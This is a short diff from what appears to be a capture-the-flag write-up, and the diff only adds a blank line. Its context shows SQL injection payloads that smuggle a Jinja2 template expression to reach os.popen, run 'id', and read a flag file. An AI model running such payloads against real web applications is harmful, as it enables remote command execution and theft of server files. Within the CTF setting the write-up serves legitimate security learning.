@@ -129,6 +129,7 @@ we have a hint form the author : `The second part of the flag has to do with you
 `junk' UNION SELECT "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
 " FROM flags--`
 ![image](https://user-images.githubusercontent.com/67979878/132011535-bc8ab651-6efd-496a-aa57-5a18c87db04b.png)
+
 `junk' UNION SELECT "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag2.txt').read() }}
 " FROM flags--`
 
